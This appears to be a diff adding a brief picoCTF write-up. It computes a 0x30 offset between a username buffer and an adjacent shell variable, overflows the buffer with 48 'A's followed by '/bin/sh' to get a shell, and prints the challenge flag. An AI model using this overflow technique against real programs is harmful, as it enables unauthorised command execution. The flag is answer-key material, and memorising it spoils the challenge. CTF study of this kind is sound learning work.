@@ -1,0 +1,14 @@
+
+offset = username - shell
+offset = 0x230c12a0 - 0x230c12d0 = 0x30
+
+username at 0x230c12a0
+shell at 0x230c12d0
+
+Enter username:  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh ---> it executed the shell where it gain access to the file
+
+$ ls
+flag.txt
+
+$ cat flag.txt
+picoCTF{us3rn4m3_2_sh3ll_47a81dd0}
